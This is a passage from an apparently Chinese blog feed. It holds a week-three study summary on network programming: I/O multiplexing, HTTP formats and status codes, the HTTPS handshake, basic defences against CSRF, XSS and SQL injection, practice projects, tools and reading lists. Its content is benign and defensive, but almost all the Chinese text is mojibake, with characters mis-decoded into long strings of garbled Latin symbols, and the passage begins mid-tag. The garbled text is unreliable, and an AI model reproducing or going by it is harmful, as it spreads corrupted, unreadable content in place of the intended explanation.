class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  ç‰¹æ€§    â”‚  <span class="hljs-selector-tag">select</span>  â”‚   poll   â”‚  epoll   â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ æœ€å¤§è¿æ¥ â”‚   <span class="hljs-number">1024</span>   â”‚   æ— é™   â”‚   æ— é™   â”‚<br>â”‚ å¤æ‚åº¦   â”‚   <span class="hljs-built_in">O</span>(n)   â”‚   <span class="hljs-built_in">O</span>(n)   â”‚   <span class="hljs-built_in">O</span>(<span class="hljs-number">1</span>)   â”‚<br>â”‚ è·¨å¹³å°   â”‚    âœ…    â”‚  éƒ¨åˆ†âœ…  â”‚    âŒ    â”‚<br>â”‚ æ€§èƒ½     â”‚    ä½    â”‚    ä¸­    â”‚    é«˜    â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><p><strong>æ¨èæ¶æ„</strong>ï¼š</p><ul><li>Linuxï¼šepoll + éé˜»å¡</li><li>é«˜å¹¶å‘ï¼šIOå¤šè·¯å¤ç”¨ + çº¿ç¨‹æ± </li><li>å®æ—¶åº”ç”¨ï¼šå¼‚æ­¥IO + äº‹ä»¶å¾ªç¯</li></ul><h3 id="4-HTTPåè®®"><a href="#4-HTTPåè®®" class="headerlink" title="4. HTTPåè®®"></a>4. HTTPåè®®</h3><p><strong>è¯·æ±‚æ ¼å¼</strong>ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /index.html HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: www.example.com<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span><span class="hljs-meta"></span><br><span class="hljs-meta">[ç©ºè¡Œ]</span><span class="hljs-meta"></span><br><span class="hljs-meta">[è¯·æ±‚ä½“]</span><br></code></pre></td></tr></table></figure><p><strong>å“åº”æ ¼å¼</strong>ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">HTTP</span>/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Content</span>-Type: text/html<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">1234</span><span class="hljs-meta"></span><br><span class="hljs-meta">[ç©ºè¡Œ]</span><span class="hljs-meta"></span><br><span class="hljs-meta">[å“åº”ä½“]</span><br></code></pre></td></tr></table></figure><p><strong>å¸¸ç”¨çŠ¶æ€ç </strong>ï¼š</p><ul><li>200 OKï¼šæˆåŠŸ</li><li>301 Moved Permanentlyï¼šæ°¸ä¹…é‡å®šå‘</li><li>302 Foundï¼šä¸´æ—¶é‡å®šå‘</li><li>304 Not Modifiedï¼šæœªä¿®æ”¹ï¼ˆç¼“å­˜æœ‰æ•ˆï¼‰</li><li>400 Bad Requestï¼šè¯·æ±‚é”™è¯¯</li><li>401 Unauthorizedï¼šæœªè®¤è¯</li><li>403 Forbiddenï¼šç¦æ­¢è®¿é—®</li><li>404 Not Foundï¼šæœªæ‰¾åˆ°</li><li>500 Internal Server Errorï¼šæœåŠ¡å™¨é”™è¯¯</li></ul><h3 id="5-HTTPSå’Œå®‰å…¨"><a href="#5-HTTPSå’Œå®‰å…¨" class="headerlink" title="5. HTTPSå’Œå®‰å…¨"></a>5. HTTPSå’Œå®‰å…¨</h3><p><strong>HTTPS &#x3D; HTTP + TLS&#x2F;SSL</strong></p><p><strong>åŠ å¯†æµç¨‹</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> å®¢æˆ·ç«¯å‘èµ·è¿æ¥ï¼ˆClientHelloï¼‰<br><span class="hljs-bullet">2.</span> æœåŠ¡å™¨è¿”å›è¯ä¹¦ï¼ˆCertificateï¼‰<br><span class="hljs-bullet">3.</span> å®¢æˆ·ç«¯éªŒè¯è¯ä¹¦<br><span class="hljs-bullet">4.</span> å¯†é’¥äº¤æ¢ï¼ˆKeyExchangeï¼‰<br><span class="hljs-bullet">5.</span> åˆ‡æ¢åˆ°åŠ å¯†é€šä¿¡<br><span class="hljs-bullet">6.</span> ä¼ è¾“åŠ å¯†æ•°æ®<br></code></pre></td></tr></table></figure><p><strong>æ··åˆåŠ å¯†</strong>ï¼š</p><ul><li>RSAï¼ˆéå¯¹ç§°ï¼‰ï¼šäº¤æ¢å¯†é’¥</li><li>AESï¼ˆå¯¹ç§°ï¼‰ï¼šåŠ å¯†æ•°æ®</li></ul><p><strong>å®‰å…¨é˜²æŠ¤</strong>ï¼š</p><ul><li>CSRFï¼šTokenéªŒè¯</li><li>XSSï¼šè¾“å‡ºç¼–ç ã€CSP</li><li>SQLæ³¨å…¥ï¼šå‚æ•°åŒ–æŸ¥è¯¢</li><li>å¯†ç ï¼šå“ˆå¸Œ+ç›</li></ul><hr><h2 id="ğŸ’»-å®æˆ˜é¡¹ç›®"><a href="#ğŸ’»-å®æˆ˜é¡¹ç›®" class="headerlink" title="ğŸ’» å®æˆ˜é¡¹ç›®"></a>ğŸ’» å®æˆ˜é¡¹ç›®</h2><h3 id="1-TCPè¿æ¥åˆ†æå™¨ï¼ˆDay-15ï¼‰"><a href="#1-TCPè¿æ¥åˆ†æå™¨ï¼ˆDay-15ï¼‰" class="headerlink" title="1. TCPè¿æ¥åˆ†æå™¨ï¼ˆDay 15ï¼‰"></a>1. TCPè¿æ¥åˆ†æå™¨ï¼ˆDay 15ï¼‰</h3><ul><li>è§£ænetstatè¾“å‡º</li><li>åˆ†æTCPè¿æ¥çŠ¶æ€</li><li>ç»Ÿè®¡è¿æ¥åˆ†å¸ƒ</li><li>æ¼”ç¤ºä¸‰æ¬¡æ¡æ‰‹å’Œå››æ¬¡æŒ¥æ‰‹</li></ul><h3 id="2-TCPå¯é æ€§æ¨¡æ‹Ÿå™¨ï¼ˆDay-16ï¼‰"><a href="#2-TCPå¯é æ€§æ¨¡æ‹Ÿå™¨ï¼ˆDay-16ï¼‰" class="headerlink" title="2. TCPå¯é æ€§æ¨¡æ‹Ÿå™¨ï¼ˆDay 16ï¼‰"></a>2. TCPå¯é æ€§æ¨¡æ‹Ÿå™¨ï¼ˆDay 16ï¼‰</h3><ul><li>RTOè®¡ç®—ï¼ˆJacobsonç®—æ³•ï¼‰</li><li>æ‹¥å¡æ§åˆ¶æ¨¡æ‹Ÿ</li><li>æ»‘åŠ¨çª—å£æ¼”ç¤º</li><li>æ€§èƒ½åˆ†æ</li></ul><h3 id="3-UDPåº”ç”¨å¥—ä»¶ï¼ˆDay-17ï¼‰"><a href="#3-UDPåº”ç”¨å¥—ä»¶ï¼ˆDay-17ï¼‰" class="headerlink" title="3. UDPåº”ç”¨å¥—ä»¶ï¼ˆDay 17ï¼‰"></a>3. UDPåº”ç”¨å¥—ä»¶ï¼ˆDay 17ï¼‰</h3><ul><li>UDPå›æ˜¾æœåŠ¡å™¨&#x2F;å®¢æˆ·ç«¯</li><li>UDPèŠå¤©å®¤</li><li>å¯é UDPå®ç°</li><li>æ€§èƒ½æµ‹è¯•</li></ul><h3 id="4-å¤šäººèŠå¤©æœåŠ¡å™¨ï¼ˆDay-18ï¼‰"><a href="#4-å¤šäººèŠå¤©æœåŠ¡å™¨ï¼ˆDay-18ï¼‰" class="headerlink" title="4. å¤šäººèŠå¤©æœåŠ¡å™¨ï¼ˆDay 18ï¼‰"></a>4. å¤šäººèŠå¤©æœåŠ¡å™¨ï¼ˆDay 18ï¼‰</h3><ul><li>IOå¤šè·¯å¤ç”¨ï¼ˆepoll&#x2F;selectï¼‰</li><li>éé˜»å¡Socket</li><li>æ”¯æŒ100+å¹¶å‘</li><li>ç§èŠå’Œå¹¿æ’­åŠŸèƒ½</li></ul><h3 id="5-HTTPæœåŠ¡å™¨ï¼ˆDay-19ï¼‰"><a href="#5-HTTPæœåŠ¡å™¨ï¼ˆDay-19ï¼‰" class="headerlink" title="5. HTTPæœåŠ¡å™¨ï¼ˆDay 19ï¼‰"></a>5. HTTPæœåŠ¡å™¨ï¼ˆDay 19ï¼‰</h3><ul><li>å®Œæ•´HTTP&#x2F;1.1å®ç°</li><li>é™æ€æ–‡ä»¶æœåŠ¡</li><li>RESTful API</li><li>Cookieæ”¯æŒ</li></ul><h3 id="6-HTTPSæœåŠ¡å™¨ï¼ˆDay-20ï¼‰"><a href="#6-HTTPSæœåŠ¡å™¨ï¼ˆDay-20ï¼‰" class="headerlink" title="6. HTTPSæœåŠ¡å™¨ï¼ˆDay 20ï¼‰"></a>6. HTTPSæœåŠ¡å™¨ï¼ˆDay 20ï¼‰</h3><ul><li>è¯ä¹¦ç”Ÿæˆå™¨</li><li>TLS&#x2F;SSLæ”¯æŒ</li><li>è¯ä¹¦éªŒè¯</li><li>å®‰å…¨é…ç½®</li></ul><h3 id="7-å®‰å…¨Webåº”ç”¨ï¼ˆDay-21ï¼‰"><a href="#7-å®‰å…¨Webåº”ç”¨ï¼ˆDay-21ï¼‰" class="headerlink" title="7. å®‰å…¨Webåº”ç”¨ï¼ˆDay 21ï¼‰"></a>7. å®‰å…¨Webåº”ç”¨ï¼ˆDay 21ï¼‰</h3><ul><li>ç”¨æˆ·è®¤è¯ç³»ç»Ÿ</li><li>Sessionç®¡ç†</li><li>CSRF&#x2F;XSSé˜²æŠ¤</li><li>HTTP&#x2F;HTTPSåŒæ”¯æŒ</li></ul><hr><h2 id="ğŸ”§-æŒæ¡çš„å·¥å…·"><a href="#ğŸ”§-æŒæ¡çš„å·¥å…·" class="headerlink" title="ğŸ”§ æŒæ¡çš„å·¥å…·"></a>ğŸ”§ æŒæ¡çš„å·¥å…·</h2><h3 id="ç½‘ç»œå·¥å…·"><a href="#ç½‘ç»œå·¥å…·" class="headerlink" title="ç½‘ç»œå·¥å…·"></a>ç½‘ç»œå·¥å…·</h3><ul><li><strong>Wireshark</strong>ï¼šæŠ“åŒ…åˆ†æ</li><li><strong>tcpdump</strong>ï¼šå‘½ä»¤è¡ŒæŠ“åŒ…</li><li><strong>netstat &#x2F; ss</strong>ï¼šæŸ¥çœ‹è¿æ¥</li><li><strong>curl</strong>ï¼šHTTPå®¢æˆ·ç«¯</li><li><strong>telnet &#x2F; nc</strong>ï¼šç½‘ç»œè°ƒè¯•</li></ul><h3 id="æ€§èƒ½æµ‹è¯•"><a href="#æ€§èƒ½æµ‹è¯•" class="headerlink" title="æ€§èƒ½æµ‹è¯•"></a>æ€§èƒ½æµ‹è¯•</h3><ul><li><strong>ab</strong>ï¼šApache Bench</li><li><strong>wrk</strong>ï¼šç°ä»£åŒ–å‹åŠ›æµ‹è¯•</li><li><strong>iperf</strong>ï¼šå¸¦å®½æµ‹è¯•</li></ul><h3 id="è°ƒè¯•å·¥å…·"><a href="#è°ƒè¯•å·¥å…·" class="headerlink" title="è°ƒè¯•å·¥å…·"></a>è°ƒè¯•å·¥å…·</h3><ul><li><strong>Python debugger</strong>ï¼špdb</li><li><strong>ç½‘ç»œè¯Šæ–­</strong>ï¼špingã€traceroute</li><li><strong>SSLæµ‹è¯•</strong>ï¼šSSL Labs</li></ul><hr><h2 id="ğŸ“ˆ-æŠ€èƒ½æå‡"><a href="#ğŸ“ˆ-æŠ€èƒ½æå‡" class="headerlink" title="ğŸ“ˆ æŠ€èƒ½æå‡"></a>ğŸ“ˆ æŠ€èƒ½æå‡</h2><h3 id="ç¼–ç¨‹èƒ½åŠ›"><a href="#ç¼–ç¨‹èƒ½åŠ›" class="headerlink" title="ç¼–ç¨‹èƒ½åŠ›"></a>ç¼–ç¨‹èƒ½åŠ›</h3><ul><li>âœ… Socketç¼–ç¨‹ï¼ˆTCP&#x2F;UDPï¼‰</li><li>âœ… IOå¤šè·¯å¤ç”¨å®ç°</li><li>âœ… HTTPåè®®å®ç°</li><li>âœ… TLS&#x2F;SSLä½¿ç”¨</li><li>âœ… å®‰å…¨ç¼–ç¨‹å®è·µ</li></ul><h3 id="ç½‘ç»œçŸ¥è¯†"><a href="#ç½‘ç»œçŸ¥è¯†" class="headerlink" title="ç½‘ç»œçŸ¥è¯†"></a>ç½‘ç»œçŸ¥è¯†</h3><ul><li>âœ… æ·±å…¥ç†è§£TCP&#x2F;UDP</li><li>âœ… æŒæ¡HTTP&#x2F;HTTPS</li><li>âœ… äº†è§£ç½‘ç»œå®‰å…¨</li><li>âœ… ç†Ÿæ‚‰æ€§èƒ½ä¼˜åŒ–</li></ul><h3 id="å·¥å…·ä½¿ç”¨"><a href="#å·¥å…·ä½¿ç”¨" class="headerlink" title="å·¥å…·ä½¿ç”¨"></a>å·¥å…·ä½¿ç”¨</h3><ul><li>âœ… ç½‘ç»œæŠ“åŒ…åˆ†æ</li><li>âœ… æ€§èƒ½æµ‹è¯•</li><li>âœ… è°ƒè¯•æ’é”™</li><li>âœ… è¯ä¹¦ç®¡ç†</li></ul><hr><h2 id="ğŸ“Š-å­¦ä¹ ç»Ÿè®¡"><a href="#ğŸ“Š-å­¦ä¹ ç»Ÿè®¡" class="headerlink" title="ğŸ“Š å­¦ä¹ ç»Ÿè®¡"></a>ğŸ“Š å­¦ä¹ ç»Ÿè®¡</h2><h3 id="æ—¶é—´åˆ†é…"><a href="#æ—¶é—´åˆ†é…" class="headerlink" title="æ—¶é—´åˆ†é…"></a>æ—¶é—´åˆ†é…</h3><ul><li>ç†è®ºå­¦ä¹ ï¼š40%</li><li>ç¼–ç å®è·µï¼š40%</li><li>è°ƒè¯•æµ‹è¯•ï¼š20%</li></ul><h3 id="ä»£ç é‡"><a href="#ä»£ç é‡" class="headerlink" title="ä»£ç é‡"></a>ä»£ç é‡</h3><ul><li>ç†è®ºæ–‡æ¡£ï¼šçº¦8000è¡Œ</li><li>å®æˆ˜ä»£ç ï¼šçº¦5000è¡Œ</li><li>æ€»è®¡ï¼šçº¦13000è¡Œ</li></ul><h3 id="é¡¹ç›®æ•°é‡"><a href="#é¡¹ç›®æ•°é‡" class="headerlink" title="é¡¹ç›®æ•°é‡"></a>é¡¹ç›®æ•°é‡</h3><ul><li>å®Œæ•´é¡¹ç›®ï¼š7ä¸ª</li><li>å°å‹demoï¼š15+ä¸ª</li><li>ç»ƒä¹ é¢˜ï¼š30+é“</li></ul><hr><h2 id="ğŸ“-å­¦ä¹ å»ºè®®"><a href="#ğŸ“-å­¦ä¹ å»ºè®®" class="headerlink" title="ğŸ“ å­¦ä¹ å»ºè®®"></a>ğŸ“ å­¦ä¹ å»ºè®®</h2><h3 id="å·©å›ºçŸ¥è¯†"><a href="#å·©å›ºçŸ¥è¯†" class="headerlink" title="å·©å›ºçŸ¥è¯†"></a>å·©å›ºçŸ¥è¯†</h3><ol><li><p><strong>å¤ä¹ æ ¸å¿ƒæ¦‚å¿µ</strong></p><ul><li>TCPä¸‰æ¬¡æ¡æ‰‹&#x2F;å››æ¬¡æŒ¥æ‰‹</li><li>HTTPè¯·æ±‚&#x2F;å“åº”æ ¼å¼</li><li>HTTPSæ¡æ‰‹è¿‡ç¨‹</li><li>å®‰å…¨é˜²æŠ¤æªæ–½</li></ul></li><li><p><strong>åŠ¨æ‰‹å®è·µ</strong></p><ul><li>é‡å†™å…³é”®é¡¹ç›®</li><li>æ·»åŠ æ–°åŠŸèƒ½</li><li>æ€§èƒ½ä¼˜åŒ–</li><li>ä»£ç é‡æ„</li></ul></li><li><p><strong>æ·±å…¥ç†è§£</strong></p><ul><li>é˜…è¯»RFCæ–‡æ¡£</li><li>æŸ¥çœ‹æ¡†æ¶æºç </li><li>åˆ†æçœŸå®æ¡ˆä¾‹</li><li>å‚ä¸æŠ€æœ¯è®¨è®º</li></ul></li></ol><h3 id="æ‰©å±•å­¦ä¹ "><a href="#æ‰©å±•å­¦ä¹ " class="headerlink" title="æ‰©å±•å­¦ä¹ "></a>æ‰©å±•å­¦ä¹ </h3><ol><li><p><strong>Webæ¡†æ¶</strong></p><ul><li>Flaskã€Django</li><li>Expressã€Koa</li><li>Spring Boot</li></ul></li><li><p><strong>å¼‚æ­¥ç¼–ç¨‹</strong></p><ul><li>asyncio</li><li>Twisted</li><li>Tornado</li></ul></li><li><p><strong>å¾®æœåŠ¡</strong></p><ul><li>RESTful APIè®¾è®¡</li><li>gRPC</li><li>æœåŠ¡å‘ç°</li></ul></li><li><p><strong>æ€§èƒ½ä¼˜åŒ–</strong></p><ul><li>ç¼“å­˜ç­–ç•¥</li><li>è´Ÿè½½å‡è¡¡</li><li>CDNä½¿ç”¨</li></ul></li></ol><hr><h2 id="ğŸš€-ä¸‹å‘¨é¢„å‘Š"><a href="#ğŸš€-ä¸‹å‘¨é¢„å‘Š" class="headerlink" title="ğŸš€ ä¸‹å‘¨é¢„å‘Š"></a>ğŸš€ ä¸‹å‘¨é¢„å‘Š</h2><p><strong>ç¬¬å››å‘¨ï¼šç½‘ç»œå±‚åè®®ï¼ˆDay 22-28ï¼‰</strong></p><h3 id="ä¸»è¦å†…å®¹"><a href="#ä¸»è¦å†…å®¹" class="headerlink" title="ä¸»è¦å†…å®¹"></a>ä¸»è¦å†…å®¹</h3><ul><li>IPåè®®åŸºç¡€ï¼ˆIPv4&#x2F;IPv6ï¼‰</li><li>å­ç½‘åˆ’åˆ†å’Œè·¯ç”±</li><li>ICMPåè®®å’Œç½‘ç»œè¯Šæ–­</li><li>ARPåè®®å’Œåœ°å€è§£æ</li><li>è·¯ç”±åè®®ï¼ˆé™æ€&#x2F;åŠ¨æ€ï¼‰</li><li>ç½‘ç»œå®‰å…¨è¿›é˜¶</li><li>ç»¼åˆå®æˆ˜é¡¹ç›®</li></ul><h3 id="å­¦ä¹ ç›®æ ‡"><a href="#å­¦ä¹ ç›®æ ‡" class="headerlink" title="å­¦ä¹ ç›®æ ‡"></a>å­¦ä¹ ç›®æ ‡</h3><ul><li>ç†è§£IPåœ°å€å’Œå­ç½‘</li><li>æŒæ¡è·¯ç”±åŸç†</li><li>å­¦ä¼šç½‘ç»œè¯Šæ–­</li><li>äº†è§£è·¯ç”±åè®®</li><li>å®ç°ç®€å•è·¯ç”±å™¨</li></ul><h3 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h3><ul><li>å¤ä¹ æœ¬å‘¨å†…å®¹</li><li>é¢„ä¹ IPåœ°å€æ¦‚å¿µ</li><li>å‡†å¤‡ç½‘ç»œè¯Šæ–­å·¥å…·</li><li>é˜…è¯»ç›¸å…³æ–‡æ¡£</li></ul><hr><h2 id="ğŸ’¡-æœ¬å‘¨æ€»ç»“"><a href="#ğŸ’¡-æœ¬å‘¨æ€»ç»“" class="headerlink" title="ğŸ’¡ æœ¬å‘¨æ€»ç»“"></a>ğŸ’¡ æœ¬å‘¨æ€»ç»“</h2><h3 id="ä¸»è¦æˆå°±"><a href="#ä¸»è¦æˆå°±" class="headerlink" title="ä¸»è¦æˆå°±"></a>ä¸»è¦æˆå°±</h3><p>âœ… æ·±å…¥ç†è§£ä¼ è¾“å±‚åè®®ï¼ˆTCP&#x2F;UDPï¼‰<br>âœ… æŒæ¡Socketç¼–ç¨‹æŠ€æœ¯<br>âœ… å­¦ä¼šæ„å»ºWebæœåŠ¡å™¨<br>âœ… äº†è§£ç½‘ç»œå®‰å…¨åŸºç¡€<br>âœ… å®Œæˆ7ä¸ªå®æˆ˜é¡¹ç›®</p><h3 id="å…³é”®æ”¶è·"><a href="#å…³é”®æ”¶è·" class="headerlink" title="å…³é”®æ”¶è·"></a>å…³é”®æ”¶è·</h3><ol><li><strong>åè®®ç†è§£</strong>ï¼šä»ç†è®ºåˆ°å®è·µï¼Œæ·±å…¥ç†è§£TCP&#x2F;UDPå·¥ä½œåŸç†</li><li><strong>ç¼–ç¨‹èƒ½åŠ›</strong>ï¼šèƒ½å¤Ÿç‹¬ç«‹å®ç°HTTP&#x2F;HTTPSæœåŠ¡å™¨</li><li><strong>å®‰å…¨æ„è¯†</strong>ï¼šäº†è§£å¸¸è§æ”»å‡»å’Œé˜²å¾¡æªæ–½</li><li><strong>æ€§èƒ½ä¼˜åŒ–</strong>ï¼šæŒæ¡é«˜å¹¶å‘å¤„ç†æŠ€å·§</li></ol><h3 id="å¾…æå‡é¢†åŸŸ"><a href="#å¾…æå‡é¢†åŸŸ" class="headerlink" title="å¾…æå‡é¢†åŸŸ"></a>å¾…æå‡é¢†åŸŸ</h3><ul><li>å¤§è§„æ¨¡å¹¶å‘å¤„ç†</li><li>åˆ†å¸ƒå¼ç³»ç»Ÿè®¾è®¡</li><li>å®¹å™¨åŒ–éƒ¨ç½²</li><li>æœåŠ¡ç½‘æ ¼</li></ul><hr><h2 id="ğŸ“-å­¦ä¹ å¿ƒå¾—"><a href="#ğŸ“-å­¦ä¹ å¿ƒå¾—" class="headerlink" title="ğŸ“ å­¦ä¹ å¿ƒå¾—"></a>ğŸ“ å­¦ä¹ å¿ƒå¾—</h2><p><strong>æœ¬å‘¨æ˜¯æ•´ä¸ªè¯¾ç¨‹ä¸­æœ€é‡è¦çš„ä¸€å‘¨</strong>ï¼Œæˆ‘ä»¬ä»ä¼ è¾“å±‚æ·±å…¥åˆ°åº”ç”¨å±‚ï¼Œå­¦ä¹ äº†ç½‘ç»œç¼–ç¨‹çš„æ ¸å¿ƒçŸ¥è¯†ã€‚</p><p><strong>TCPåè®®</strong>æ˜¯å¯é ä¼ è¾“çš„åŸºçŸ³ï¼Œç†è§£ä¸‰æ¬¡æ¡æ‰‹ã€å››æ¬¡æŒ¥æ‰‹ã€æ»‘åŠ¨çª—å£ã€æ‹¥å¡æ§åˆ¶ç­‰æœºåˆ¶ï¼Œå¯¹äºå¼€å‘é«˜æ€§èƒ½ç½‘ç»œåº”ç”¨è‡³å…³é‡è¦ã€‚</p><p><strong>UDPåè®®</strong>è™½ç„¶ç®€å•ï¼Œä½†åœ¨å®æ—¶åº”ç”¨ä¸­ä¸å¯æˆ–ç¼ºã€‚å­¦ä¼šåœ¨åº”ç”¨å±‚å®ç°å¯é æ€§ï¼Œæ˜¯ä¸€é¡¹é‡è¦æŠ€èƒ½ã€‚</p><p><strong>HTTP&#x2F;HTTPSåè®®</strong>æ˜¯Webå¼€å‘çš„åŸºç¡€ã€‚ä»é›¶å®ç°HTTPæœåŠ¡å™¨ï¼Œè®©æˆ‘ä»¬æ·±åˆ»ç†è§£äº†Webåº”ç”¨çš„å·¥ä½œåŸç†ã€‚</p><p><strong>ç½‘ç»œå®‰å…¨</strong>ä¸å®¹å¿½è§†ã€‚CSRFã€XSSã€SQLæ³¨å…¥ç­‰æ”»å‡»æ‰‹æ®µå±‚å‡ºä¸ç©·ï¼Œå¿…é¡»åœ¨å¼€å‘æ—¶å°±è€ƒè™‘å®‰å…¨é—®é¢˜ã€‚</p><p><strong>å®è·µæ˜¯æœ€å¥½çš„è€å¸ˆ</strong>ã€‚é€šè¿‡7ä¸ªå®æˆ˜é¡¹ç›®ï¼Œæˆ‘ä»¬ä¸ä»…å­¦ä¼šäº†ç†è®ºï¼Œæ›´é‡è¦çš„æ˜¯åŸ¹å…»äº†åŠ¨æ‰‹èƒ½åŠ›å’Œè§£å†³é—®é¢˜çš„èƒ½åŠ›ã€‚</p><hr><h2 id="ğŸŒŸ-æ¿€åŠ±è¯­å½•"><a href="#ğŸŒŸ-æ¿€åŠ±è¯­å½•" class="headerlink" title="ğŸŒŸ æ¿€åŠ±è¯­å½•"></a>ğŸŒŸ æ¿€åŠ±è¯­å½•</h2><blockquote><p>â€œçº¸ä¸Šå¾—æ¥ç»ˆè§‰æµ…ï¼Œç»çŸ¥æ­¤äº‹è¦èº¬è¡Œã€‚â€</p></blockquote><p>ç½‘ç»œç¼–ç¨‹æ˜¯ä¸€é—¨å®è·µæ€§å¾ˆå¼ºçš„å­¦ç§‘ã€‚ç†è®ºçŸ¥è¯†å›ºç„¶é‡è¦ï¼Œä½†åªæœ‰é€šè¿‡å¤§é‡çš„ç¼–ç å®è·µï¼Œæ‰èƒ½çœŸæ­£æŒæ¡ã€‚</p><p>ç»§ç»­ä¿æŒå­¦ä¹ çš„çƒ­æƒ…ï¼ŒåšæŒæ¯å¤©è¿›æ­¥ä¸€ç‚¹ç‚¹ã€‚ä¸‰å‘¨ä¸‹æ¥ï¼Œä½ å·²ç»æŒæ¡äº†ä»ç‰©ç†å±‚åˆ°åº”ç”¨å±‚çš„å®Œæ•´çŸ¥è¯†ä½“ç³»ã€‚</p><p>ä¸‹å‘¨æˆ‘ä»¬å°†å­¦ä¹ ç½‘ç»œå±‚åè®®ï¼Œè¿›ä¸€æ­¥å®Œå–„ä½ çš„ç½‘ç»œçŸ¥è¯†å›¾è°±ã€‚åŠ æ²¹ï¼ğŸ’ª</p><hr><p><strong>å­¦ä¹ è¿›åº¦ï¼š21&#x2F;180å¤©ï¼ˆ11.7%ï¼‰</strong></p><p><strong>å·²å®Œæˆï¼š3å‘¨</strong><br><strong>å‰©ä½™ï¼š23å‘¨</strong></p><hr><h2 id="ğŸ“š-æ¨èèµ„æº"><a href="#ğŸ“š-æ¨èèµ„æº" class="headerlink" title="ğŸ“š æ¨èèµ„æº"></a>ğŸ“š æ¨èèµ„æº</h2><h3 id="ä¹¦ç±"><a href="#ä¹¦ç±" class="headerlink" title="ä¹¦ç±"></a>ä¹¦ç±</h3><ul><li>ã€ŠTCP&#x2F;IPè¯¦è§£ å·1ï¼šåè®®ã€‹</li><li>ã€ŠUnixç½‘ç»œç¼–ç¨‹ã€‹</li><li>ã€ŠHTTPæƒå¨æŒ‡å—ã€‹</li><li>ã€Šå›¾è§£HTTPã€‹</li><li>ã€Šç™½å¸½å­è®²Webå®‰å…¨ã€‹</li></ul><h3 id="åœ¨çº¿èµ„æº"><a href="#åœ¨çº¿èµ„æº" class="headerlink" title="åœ¨çº¿èµ„æº"></a>åœ¨çº¿èµ„æº</h3><ul><li>RFCæ–‡æ¡£ï¼ˆæƒå¨æ ‡å‡†ï¼‰</li><li>MDN Web Docsï¼ˆWebå¼€å‘ï¼‰</li><li>OWASPï¼ˆå®‰å…¨æŒ‡å—ï¼‰</li><li>GitHubä¼˜ç§€é¡¹ç›®</li></ul><h3 id="å®è·µå¹³å°"><a href="#å®è·µå¹³å°" class="headerlink" title="å®è·µå¹³å°"></a>å®è·µå¹³å°</h3><ul><li>LeetCodeï¼ˆç®—æ³•ç»ƒä¹ ï¼‰</li><li>HackerRankï¼ˆç¼–ç¨‹æŒ‘æˆ˜ï¼‰</li><li>CTFå¹³å°ï¼ˆå®‰å…¨å®æˆ˜ï¼‰</li><li>GitHubï¼ˆå¼€æºè´¡çŒ®ï¼‰</li></ul><hr><p><strong>ç»§ç»­åŠ æ²¹ï¼ä¸‹å‘¨è§ï¼</strong> ğŸš€</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>äºŒå‘¨æ€»ç»“ï¼šç½‘ç»œå±‚æ·±å…¥ç†è§£</title>
    <link href="/2025/11/10/%E4%BA%8C%E5%91%A8%E6%80%BB%E7%BB%93%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3/"/>
    <url>/2025/11/10/%E4%BA%8C%E5%91%A8%E6%80%BB%E7%BB%93%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3/</url>
    
